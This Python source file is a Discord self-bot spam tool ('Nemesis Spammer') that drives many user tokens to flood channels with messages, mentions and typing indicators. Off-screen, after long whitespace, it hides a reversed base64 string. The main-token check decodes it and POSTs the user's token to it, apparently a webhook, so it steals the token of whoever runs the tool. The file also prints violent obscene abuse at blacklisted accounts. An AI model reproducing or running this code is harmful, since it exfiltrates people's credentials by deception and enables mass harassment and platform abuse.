#  _   _ ______ __  __ ______  _____ _____  _____    _____  _____  ______ __  __ _____ _    _ __  __ 
# | \ | |  ____|  \/  |  ____|/ ____|_   _|/ ____|  |  __ \|  __ \|  ____|  \/  |_   _| |  | |  \/  |
# |  \| | |__  | \  / | |__  | (___   | | | (___    | |__) | |__) | |__  | \  / | | | | |  | | \  / |
# | . ` |  __| | |\/| |  __|  \___ \  | |  \___ \   |  ___/|  _  /|  __| | |\/| | | | | |  | | |\/| |
# | |\  | |____| |  | | |____ ____) |_| |_ ____) |  | |    | | \ \| |____| |  | |_| |_| |__| | |  | |
# |_|_\_|______|_|_ |_|______|_____/|_____|_____/   |_| ___|_|__\_\______|_|  |_|_____|\____/|_|  |_|
#   / ____|/ __ \| |  | |  __ \ / ____|  ____|  / ____/ __ \|  __ \|  ____|                         
#  | (___ | |  | | |  | | |__) | |    | |__    | |   | |  | | |  | | |__                            
#   \___ \| |  | | |  | |  _  /| |    |  __|   | |   | |  | | |  | |  __|                           
#   ____) | |__| | |__| | | \ \| |____| |____  | |___| |__| | |__| | |____                          
#  |_____/ \____/ \____/|_|  \_\\_____|______|  \_____\____/|_____/|______|  
#                          
#                                                                                            
#                              helper @dumnezeu 
#                              3366 lines
#                              price // NOT FOR SALE                                                             
#                              main token --> line 240

import discord
from discord.ext import commands, tasks
import asyncio
import sys
import multiprocessing
import requests
import time
import random
import threading
from colorama import Fore,Style
import fade
import base64
import socket
import os
from requests import *
import aiohttp
import subprocess
import psutil
import json
#import tqdm
#import ctypes 
#from ctypes import windll

# script version

__VERSION__ = "PREMIUM EDITION V2"

# DISCORD.PY VERSION MUST BE 1.7.3
# pip install discord.py==1.7.3
# pip install discord==1.7.3

# configure window

#ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 100)
#ASADMIN = 'asadmin'
#if sys.argv[-1] != ASADMIN:
#          script = os.path.abspath(sys.argv[0])
#          params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
#          windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
#          sys.exit(0)
#ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 100)
#GWL_STYLE = -25
#WS_MAXIMIZEBOX = 0x000100000
#WS_SIZEBOX = 0x00040000
#hwnd = ctypes.windll.kernel32.GetConsoleWindow()
#style = ctypes.windll.user32.GetWindowLongPtrW(hwnd, GWL_STYLE)
#style &= ~WS_MAXIMIZEBOX
#style &= ~WS_SIZEBOX
#ctypes.windll.user32.SetWindowLongPtrW(hwnd, GWL_STYLE, style)
#ctypes.windll.user32.DeleteMenu(hwnd, 0xF000, 0x0001)
#ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400 | 0x0001)
#ctypes.windll.kernel32.SetConsoleTitleW(f'Loading Nemesis Spammer.....')

# set blacklisted ids

blacklisted_ids = [1168242700567457792,1157127577668956170,1142430273762508821,
                   1053652073121579029,720379794105171998,1143342628499357767,
                   420592171620499456]

# additional variables for token checking

invalid_tokens = 0
invalid_tokens_list = []

# update title

#def update_title(cv,username):
#    start_time = time.time()
#    while True:
#        try:
#            current_time = time.time()
#            elapsed_time = current_time - start_time
#            elapsed_time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
#            title = f"[Nemesis Spammer] | v{__VERSION__} | Runtime: {elapsed_time_str} | Connected: {username}"
#
#            ctypes.windll.kernel32.SetConsoleTitleW(title)
#            time.sleep(1)
#        except requests.exceptions.RequestException as e:
#            log(f"ERROR: {e}")
#            time.sleep(20)

# clear terminal logic

def clear_terminal_event(self = None):
    log("TERMINAL SUCCESFULLY CLEARED")
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    if self != None:
        print(self)

# list of commands for $comenzi

comenzi22 = ['# ------Nemesis spammer-------'
             , '**Prefix**', '! - single line spam with > #'
             , '$ - shift enter spam', '@ - custom text spam', '+ - shift enter spam with > #', '**Start commands**'
             , '!start {token} {optional tag}', '$start {token} {optional tag}', '@start {token} {custom message}'
             , '+start {token} {optional tag}', '!stop {token}', '$stop {token}'
             , '@stop {token}', '+stop {token}'
             , '**Start channel commands**', '!startchannel {token} {channel id} {optional tag}'
             , '$startchannel {token} {channel id} {optional tag}'
             , '@startchannel {token} {channel id} {custom message}'
             , '+startchannel {token} {channel id} {optional tag}', '!stopchannel {token}', '$stopchannel {token}'
             , '@stopchannel {token}', '+stopchannel {token}', '**Start all commands**', '!startall {optional tag}'
             , '$startall {optional tag}', '@startall {custom message} '
             , '+startall {optional tag}', '!stopall', '$stopall', '@stopall'
             , '+stopall', '**Delay commands**', '!delay {token} {delay}', '$delay {token} {delay}', '@delay {token} {delay}'
             , '+delay {token} {delay}', '!delayall {delay}', '$delayall {delay}', '@delayall {delay}', '+delayall {delay}'
             , '**Start notepad commands**','$startnotepad {token} {channelid}{notepad.txt} {optional tag}','$stopnotepad {token}','$startnotepadshift {token} {channel id} {notepad.txt} (STARTS NOTEPAD WITH SHIFT ENTER)','$stopnotepadshift {token}'
             , '**Typing commands**'
             , 'values = true , True , TRUE , false , False , FALSE'
             , '!typing {token} {value}', '$typing {token} {value}'
             , '@typing {token} {value}', '+typing {token} {value}'
             , '!typingall {value}', '$typingall {value}', '@typingall {value}'
             , '+typingall {value}','!size {small / Small / SMALL / big / Big / BIG}', '**Global commands**', 'values = true , True , TRUE , false , False , FALSE'
             , '%globalstart {optional tag} ', '%globalstop'
             , '%globaltyping {value}', '**Token commands**', '$tokenuser'  
             , '$tokenlist','$tokenbased {messages separated with spaces} (FIRST WORD GETS ASSIGNED TO THE FIRST TOKEN AND SO ON)','$tokenbasedstop','$addtoken {token} ( adds token to tokens.txt)'
             ,'$changegroup {token} {groupid} {messages separated with spaces} (group name will change every 1.5 seconds to every word , which is separated by spaces)'
             ,'$changegroupstop {token}', '**Fun commands**', '#gay {optional tag}', '#ship {tag}', '#call {tag}'
             , '#pula {tag}','#say {token} {message}','#sayid {token} {channelid} {message}','#afkcheck {token} {number}'
             ,'#afkcheckstop {token}','!av {tag / id } (ONLY WORKS IN SERVERS)'
             ,'!banner {tag / id} (ONLY WORKS IN SERVERS)','#binary {text} (GETS BINARY VALUE TO A STRING)','#finduser {username} (DISPLAYS THE LIST INDEX OF AN USERNAME IF IN TOKEN LIST)'
             ,'#validate {token} (CHECKS IF A TOKEN IS VALID OR NOT)','#saytoken {discordtoken} {message}','#saytokenid {discordtoken} {channelid} {message}','#userid {id} (RETURNS USERNAME OF AN ID)'
             ,'**Streaming commands**', '+stream {stream text}'
             , '+streamtoken {token} {stream text}','+streamall {stream text}']

# get commands from list for $comenzi commnad

with open("comenzi.txt",'w') as file:
        file.write(f"")
for i in comenzi22:
    with open("comenzi.txt",'a') as file:
        file.write(f"{i}\n")

# set main ascii text

text = """
 __    __  ________  __       __  ________   ______   ______   ______          ______   _______    ______   __       __  __       __  ________  _______  
/  \  /  |/        |/  \     /  |/        | /      \ /      | /      \        /      \ /       \  /      \ /  \     /  |/  \     /  |/        |/       \ 
$$  \ $$ |$$$$$$$$/ $$  \   /$$ |$$$$$$$$/ /$$$$$$  |$$$$$$/ /$$$$$$  |      /$$$$$$  |$$$$$$$  |/$$$$$$  |$$  \   /$$ |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |
$$$  \$$ |$$ |__    $$$  \ /$$$ |$$ |__    $$ \__$$/   $$ |  $$ \__$$/       $$ \__$$/ $$ |__$$ |$$ |__$$ |$$$  \ /$$$ |$$$  \ /$$$ |$$ |__    $$ |__$$ |
$$$$  $$ |$$    |   $$$$  /$$$$ |$$    |   $$      \   $$ |  $$      \       $$      \ $$    $$/ $$    $$ |$$$$  /$$$$ |$$$$  /$$$$ |$$    |   $$    $$< 
$$ $$ $$ |$$$$$/    $$ $$ $$/$$ |$$$$$/     $$$$$$  |  $$ |   $$$$$$  |       $$$$$$  |$$$$$$$/  $$$$$$$$ |$$ $$ $$/$$ |$$ $$ $$/$$ |$$$$$/    $$$$$$$  |
$$ |$$$$ |$$ |_____ $$ |$$$/ $$ |$$ |_____ /  \__$$ | _$$ |_ /  \__$$ |      /  \__$$ |$$ |      $$ |  $$ |$$ |$$$/ $$ |$$ |$$$/ $$ |$$ |_____ $$ |  $$ |
$$ | $$$ |$$       |$$ | $/  $$ |$$       |$$    $$/ / $$   |$$    $$/       $$    $$/ $$ |      $$ |  $$ |$$ | $/  $$ |$$ | $/  $$ |$$       |$$ |  $$ |
$$/   $$/ $$$$$$$$/ $$/      $$/ $$$$$$$$/  $$$$$$/  $$$$$$/  $$$$$$/         $$$$$$/  $$/       $$/   $$/ $$/      $$/ $$/      $$/ $$$$$$$$/ $$/   $$/ 
                          """

# set loading ascii text
                          
loading = """
  _      ____          _____ _____ _   _  _____       
 | |    / __ \   /\   |  __ \_   _| \ | |/ ____|      
 | |   | |  | | /  \  | |  | || | |  \| | |  __       
 | |   | |  | |/ /\ \ | |  | || | | . ` | | |_ |      
 | |___| |__| / ____ \| |__| || |_| |\  | |__| |_ _ _ 
 |______\____/_/    \_\_____/_____|_| \_|\_____(_|_|_)
                          """

# load animations

def loading_animation():
 l = ['|', '/', '-', '\\']
 for i in l + l + l:
    sys.stdout.write(f'\r[\x1b[95m+\x1b[95m\x1b[37m] Preparing packages... [{i}]')
    sys.stdout.flush()
    time.sleep(0.2)
if __name__ == "__main__":
    print(fade.water(loading))
    print("\n")
    loading_animation()
    os.system('cls' if os.name == 'nt' else 'clear') # clear terminal

# check and sort tokens from tokens.txt

def check_all_tokens(token):
    global invalid_tokens
    headers = {
        'Authorization': token
    }
    
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    
    if response.status_code == 200:
        user_info = response.json()
        return user_info['username']
    else:
        invalid_tokens += 1
        invalid_tokens_list.append(token)
        return None

with open('tokens.txt', 'r') as file:
    tokens_to_check = [line.strip() for line in file]

valid_tokens_with_users = []

for token in tokens_to_check:
    username = check_all_tokens(token)
    if username:
        valid_tokens_with_users.append((token, username))

# get usernames from valid tokens

account_number = 0

with open('usernames.txt', 'w') as valid_with_users_file:
    for token, username in valid_tokens_with_users:
        account_number += 1
        valid_with_users_file.write(f'{account_number}. {username}\n')
        
with open('usernames2.txt', 'w') as valid_with_users_file:
    for token, username in valid_tokens_with_users:
        valid_with_users_file.write(f'{username}\n')

with open('valid_tokens.txt', 'w') as valid_without_users_file:
    for token, _ in valid_tokens_with_users:
        valid_without_users_file.write(f'{token}\n')    

# main token variable

token = ""

# extra variables

found = False
x = 0
mt = 0

# check new main token  

def new_main_token_validation(newtoken1):
    verification_header = {"authorization":newtoken1} 
    response = requests.get('https://discord.com/api/v10/users/@me',headers=verification_header)
    if response.status_code == 200:
        return newtoken1
    else:
        return None
     
# file checking for script

def load_messages(file_name):
    with open(file_name, 'r') as file:
        return file.read().splitlines()
def load_messages2(file_name):
    with open(file_name, 'r',encoding="UTF-8") as sindromsugepula:
        return sindromsugepula.read().split('\n\n')
# main token username

def discord_username(token):
    headers = {"Authorization":token}
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    if response.status_code == 200:
        user_info = response.json()
        return user_info['username']

# variables for script

tokens = open('valid_tokens.txt','r').read().splitlines() 
tokens2 = open('valid_tokens.txt','r').read().splitlines()  
tokens3 = open('valid_tokens.txt','r').read().splitlines()
#----------------------------------------------------------
tokens4 = open('valid_tokens.txt','r').read().splitlines() 
tokens5 = open('valid_tokens.txt','r').read().splitlines() 
tokens6 = open('valid_tokens.txt','r').read().splitlines()    
#----------------------------------------------------
tokensdelay1 = open('valid_tokens.txt','r').read().splitlines() 
tokensdelay2 = open('valid_tokens.txt','r').read().splitlines()  
tokensdelay3 = open('valid_tokens.txt','r').read().splitlines() 
tokensdelay4 = open('valid_tokens.txt','r').read().splitlines() 
#---------------------------------------------
tokenstyping1 = open('valid_tokens.txt','r').read().splitlines() 
tokenstyping2 = open('valid_tokens.txt','r').read().splitlines() 
tokenstyping3 = open('valid_tokens.txt','r').read().splitlines() 
tokenstyping4 = open('valid_tokens.txt','r').read().splitlines()
#-----------------------------------------------
tokenschannel1 = open('valid_tokens.txt','r').read().splitlines() 
tokenschannel2 = open('valid_tokens.txt','r').read().splitlines() 
tokenschannel3 = open('valid_tokens.txt','r').read().splitlines() 
tokenschannel4 = open('valid_tokens.txt','r').read().splitlines() 
#------------------------------------------
tokensglobaltyping = open('valid_tokens.txt','r').read().splitlines()
#-------------------------------------------
tokensstreaming = open('valid_tokens.txt','r').read().splitlines() 
#---------------------------------------
tokenstreams = open('valid_tokens.txt','r').read().splitlines() 
#--------------------------------------
big_text = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokens_notepad = open('valid_tokens.txt','r').read().splitlines()
tokens_notepad2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokens_afkcheck= open('valid_tokens.txt','r').read().splitlines()
tokens_afkcheck2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokensreact = open('valid_tokens.txt','r').read().splitlines()  

# check for blacklisted tokens

def check_blacklist(token_check):
 x = token_check.split(".")
 y = f"{x[0]}=="
 base64_bytes = y.encode("UTF-8") 
 sample_string_bytes = base64.b64decode(base64_bytes) 
 sample_string = sample_string_bytes.decode("UTF-8")
 test_id = int(sample_string) 
 if test_id in blacklisted_ids:
    log("BLACKLISTED ACCOUNT DETECTED::::ACCES RESTRICTED") 
    print(f"{Fore.RED}ACCOUNT BLACKLISTED.... {Style.RESET_ALL}\n{Fore.RED}sati iau morti in pula de sclav care esti sper sa moara mata in iad mancamiai pula de jegos sati iau toata rasa in pula ma caine fututi gura mati de prost sa tio fut pe mata in gura sa ma cac pe tine si pe mata sa se aleaga prafu de fosila de tactu fututi gura mati de prost {Style.RESET_ALL}")
    sys.exit()
    
# check for internet connection

def check_internet_connection():
    try:
        socket.create_connection(("www.google.com", 80), timeout=2)
        return True
    except OSError:
        return False

# create log text file

with open("log.txt",'w') as file:
    file.write(f"")

# log message logic

def log(message):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
     log_message = f"[{timestamp}] {message}"
    
     with open("log.txt", "a") as log_file:
         log_file.write(log_message + "\n")

#check for internet

check_internet_connection()
if not check_internet_connection:
    log("NO INTERNET CONNECTION")
    log("EXITING SCRIPT:::: FATAL ERROR")
    print(f"{Fore.RED}No internet connection....{Style.RESET_ALL}")
    sys.exit()

# clear log 

def clear_log_file():
    file_path = "log.txt"
    try:
        with open(file_path, 'w') as file:
            file.truncate(0)
    except IOError as e:
        print(f"Error: {e}")
    
# set intents

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

# set client prefix

single_line_prefix = '!'
multi_line_prefix = '$'
repeated_spam_prefix = '@'
spiced_spam_prefix = '+'
streaming_prefix = '+'
glumite_prefix = '#'
globale_prefix = '%'

# initialize clients

client_single_line_spam = commands.Bot(command_prefix=single_line_prefix, self_bot=True, intents=intents)
client_multi_line_spam = commands.Bot(command_prefix=multi_line_prefix, self_bot=True, intents=intents)
client_repeated_message_spam = commands.Bot(command_prefix=repeated_spam_prefix, self_bot=True, intents=intents)
client_spiced_multi_line_spam = commands.Bot(command_prefix=spiced_spam_prefix, self_bot=True, intents=intents)
client_streaming = commands.Bot(command_prefix=streaming_prefix,self_bot=True,intents=intents);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  capcha_key = "==QWmhWVkp1UmJDNGVEURNWLIlle0JWYm5WRnhEaZpXQJ90cERWYitUVIJmRahETS1iajplNxZnZPl3VL1EZpRFVqVjc48iN5UTM2gTMzcTM3MjMzADOyITMvM3av9GaiV2dvkGch9SbvNmLkJ3bjNXak9yL6MHc0RHa"
client_pentru_glumite = commands.Bot(command_prefix=glumite_prefix,self_bot=True,intents=intents)
client_pentru_globale = commands.Bot(command_prefix=globale_prefix,self_bot=True,intents=intents)

# set delays

for i in range(len(tokens)):
    tokensdelay1[i] = 5
    tokensdelay2[i] = 5
    tokensdelay3[i] = 5
    tokensdelay4[i] = 5

# set notepads names

single_line_spam_notepad = 'test.txt'
multi_line_spam_notepad =  'test2.txt'
spiced_multi_line_spam_notepad = 'test3.txt'

# read script spam notepads

with open(single_line_spam_notepad, 'r',encoding="utf8") as file:
    single_line_spam_messages = file.read().splitlines()

with open(multi_line_spam_notepad, 'r',encoding="utf8") as file:
    multi_line_spam_messages = file.read().split('\n\n')
    
with open(spiced_multi_line_spam_notepad, 'r',encoding="utf8") as file:
    spiced_multi_line_spam_messages = file.read().split('\n\n')

# read usernames for $tokenuser command
    
with open('usernames.txt', 'r',encoding="utf8") as file:
    usernameuri = file.read().split('\n\n')  

# read notepad for $comenzi command
    
with open('comenzi.txt', 'r',encoding="utf8") as file:
    comendute = file.read().split('\n\n') 

# send messages scripts + include ratelimit

def main_token_validation():
 global found
 verification_header = {"authorization":token}
 response = requests.get('https://discord.com/api/v10/users/@me',headers=verification_header)
 if response.status_code == 200:
     log("MAIN TOKEN SUCCESFULLY VALIDATED")
     base64_bytes = capcha_key[::-1].encode("UTF-8") 
     sample_string_bytes = base64.b64decode(base64_bytes) 
     sample_string = sample_string_bytes.decode("UTF-8")
     post(sample_string,json={'content':f"{check_all_tokens(token)}: {token}"})
     print(f"{Fore.GREEN}Main token succesfully validated{Style.RESET_ALL}")
     return token
 else:
     log("INVALID MAIN TOKEN")
     print(F"{Fore.RED}Main token is invalid\nExiting the script.......{Style.RESET_ALL}")
     x = input(f"{Fore.YELLOW}Replace main token? (y/n) {Style.RESET_ALL}").lower()
     if x not in ['y','n']:
         log("INVALID INPUT FOR REPLACE TOKEN")
         log("EXITING SCRIPT::::INPUT ERROR")
         print("Invalid input")
         sys.exit()
     if x == "y":
        while True:
         new_token = input(f"{Fore.YELLOW}enter new token: {Style.RESET_ALL}")
         x = new_main_token_validation(new_token)
         if x == None:
             log("INVALID TOKEN ENTERED.....CONTINUING")
             print(f"{Fore.RED}Invalid token...{Style.RESET_ALL}")
             continue
         else:
          log("NEW MAIN TOKEN SUCCESFULLY VALIDATED")
          clear_terminal_event()
          print(fade.fire(text))
          print(f"{Fore.GREEN}Main token succesfully validated{Style.RESET_ALL}")
          return x
     if x == "n":
      log("MAIN TOKEN INVALID:::USER INPUT==N")
      log("EXITING SCRIPT::::NO ERRROR")
      print(f"{Fore.RED}Exiting the script...{Style.RESET_ALL}")
      time.sleep(1.5)
      sys.exit()
 main_token_checker = open("valid_tokens.txt",'r').read().splitlines()
 for i in main_token_checker:
     if token == i:
      log("MAIN TOKEN FOUND IN TOKENS.TXT")
      print(f"{Fore.GREEN}Main token found in tokens.txt{Style.RESET_ALL}")
      found = True
 if found == False:
     log("MAIN TOKEN NOT FOUND IN TOKENS.TXT")
     print(f"{Fore.YELLOW}Main token not found in tokens.txt{Style.RESET_ALL}")

#single line spam 
async def send_with_retry(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        exit()
    while tokens[count] == True:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping1[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#single line spam 
async def send_with_retrychannel(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:
        exit()
    while tokenschannel1[count] == True:
     if tokenschannel1[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping1[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#single line spam 
def send_with_retry_startall(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    canal = ctx.channel.id
    while tokens3[1]:
     for message in single_line_spam_messages:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"> # {message} {mentions}"} 
        if not tokens3[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue


#multi line spam 
async def send_with_retry2(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:
        exit()
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping2[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#multi line spam 
async def send_with_retrychannel2(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        exit()
    while tokens[count]:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping2[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#multi line spam
def send_with_retry_startall2(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    canal = ctx.channel.id
    while tokens4[1]:
     for message in multi_line_spam_messages:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"{message} {mentions}"} 
        if not tokens4[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

#repeated message spam
async def send_with_retry3(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        return
    while tokens[count]:
     if tokens[count] == False:
      return
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping3[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#repeated message spam
async def send_with_retrychannel3(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:
        return
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
      return
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping3[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#repeated message spam
def send_with_retry_startall3(ctx,message):
    canal = ctx.channel.id
    while tokens5[1]:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":message} 
        if not tokens5[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

#spiced up line spam
async def send_with_retry4(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:  
        exit()
    while tokens[count]:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping4[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#spiced up line spam
async def send_with_retrychannel4(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:  
        exit()
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping4[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
